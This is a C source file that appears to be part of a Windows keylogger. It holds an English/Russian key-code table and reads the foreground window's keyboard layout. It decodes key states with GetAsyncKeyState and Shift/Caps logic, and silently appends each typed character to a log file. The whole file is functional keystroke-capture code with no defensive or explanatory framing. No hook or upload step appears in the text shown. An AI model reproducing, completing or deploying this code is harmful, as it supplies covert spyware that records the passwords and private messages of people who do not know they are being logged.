#include <stdio.h>

#include "key.h"

static const keymap keys[256] = {
    [VK_A] = {"a", "A", "ф", "Ф"}, [VK_B] = {"b", "B", "и", "И"},
    [VK_C] = {"c", "C", "с", "С"}, [VK_D] = {"d", "D", "в", "В"},
    [VK_E] = {"e", "E", "у", "У"}, [VK_F] = {"f", "F", "а", "А"},
    [VK_G] = {"g", "G", "п", "П"}, [VK_H] = {"h", "H", "р", "Р"},
    [VK_I] = {"i", "I", "ш", "Ш"}, [VK_J] = {"j", "J", "о", "О"},
    [VK_K] = {"k", "K", "л", "Л"}, [VK_L] = {"l", "L", "д", "Д"},
    [VK_M] = {"m", "M", "ь", "Ь"}, [VK_N] = {"n", "N", "т", "Т"},
    [VK_O] = {"o", "O", "щ", "Щ"}, [VK_P] = {"p", "P", "з", "З"},
    [VK_Q] = {"q", "Q", "й", "Й"}, [VK_R] = {"r", "R", "к", "К"},
    [VK_S] = {"s", "S", "ы", "Ы"}, [VK_T] = {"t", "T", "е", "Е"},
    [VK_U] = {"u", "U", "г", "Г"}, [VK_V] = {"v", "V", "м", "М"},
    [VK_W] = {"w", "W", "ц", "Ц"}, [VK_X] = {"x", "X", "ч", "Ч"},
    [VK_Y] = {"y", "Y", "н", "Н"}, [VK_Z] = {"z", "Z", "я", "Я"},
    [VK_2] = {"2", "@", "2", "\""}, [VK_3] = {"3", "#", "3", "№"},
    [VK_4] = {"4", "$", "4", ";"},  [VK_5] = {"5", "%", "5", "%"},
    [VK_6] = {"6", "^", "6", ":"},  [VK_7] = {"7", "&", "7", "?"},
    [VK_8] = {"8", "*", "8", "*"},  [VK_9] = {"9", "(", "9", "("},
    [VK_TILDE]      = {"`", "~", "ё", "Ё"}, [VK_DASH]   = {"-", "_", "-", "_"},
    [VK_EQ]         = {"=", "+", "=", "+"}, [VK_LBRACKET] = {"[", "{", "х", "Х"},
    [VK_RBRACKET]   = {"]", "}", "ъ", "Ъ"}, [VK_DOT_COMMA]= {";", ":", "ж", "Ж"},
    [VK_APOSTROPHE] = {"'", "\"", "э", "Э"},[VK_REV_SLASH]= {"\\", "|", "\\", "/"},
    [VK_COMMA]      = {",", "<", "б", "Б"}, [VK_DOT]      = {".", ">", "ю", "Ю"},
    [VK_SLASH]      = {"/", "?", ".", ","},
    [VK_NUMPAD0]  = {"0", "0", "0", "0"},   [VK_NUMPAD1]  = {"1", "1", "1", "1"},
    [VK_NUMPAD2]  = {"2", "2", "2", "2"},   [VK_NUMPAD3]  = {"3", "3", "3", "3"},
    [VK_NUMPAD4]  = {"4", "4", "4", "4"},   [VK_NUMPAD5]  = {"5", "5", "5", "5"},
    [VK_NUMPAD6]  = {"6", "6", "6", "6"},   [VK_NUMPAD7]  = {"7", "7", "7", "7"},
    [VK_NUMPAD8]  = {"8", "8", "8", "8"},   [VK_NUMPAD9]  = {"9", "9", "9", "9"},
    [VK_MULTIPLY] = {"*", "*", "*", "*"},   [VK_ADD]      = {"+", "+", "+", "+"},
    [VK_SUBTRACT] = {"-", "-", "-", "-"},   [VK_DIVIDE]   = {"/", "/", "/", "/"},
    [VK_DECIMAL]  = {".", ".", ".", "."},   [VK_SPACE]    = {" ", " ", " ", " "},
    [VK_TAB]      = {"\t", "\t", "\t", "\t"}, [VK_RETURN] = {"\n", "\n", "\n", "\n"},
    [VK_BACK]     = {"<BACK SPACE>", "<BACK SPACE>", "<BACK SPACE>", "<BACK SPACE>"}
};


bool is_key_ru(void){
    HKL keyboard = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
    if(LOWORD(keyboard) == RU)
        return true;
    return false;
}

void save_file(const char *filename, const char *key){
    FILE *file = NULL;
	   if(key != NULL){
		      if((file = fopen(filename, "a")) != NULL){
	           fprintf(file, "%s", key);
	           fclose(file);
	    }	
	}   
}

const char* key_value(const int code){
	bool is_shift = false;
	bool is_caps = false;
	bool is_upper = false;
	if(code >= 0 && code <= 255 && code != VK_CAPITAL && keys[code].en_key != NULL){
        is_shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
		is_caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        is_upper = is_shift;
        if (code >= VK_A && code <= VK_Z)            
            is_upper = is_shift ^ is_caps;
        if(is_key_ru()){
            if(is_upper)
                return keys[code].ru_key_shift;
            else
                return keys[code].ru_key;
        }
        else if(is_upper)
                return keys[code].en_key_shift;
            else
                return keys[code].en_key;
	}
	return NULL;
}
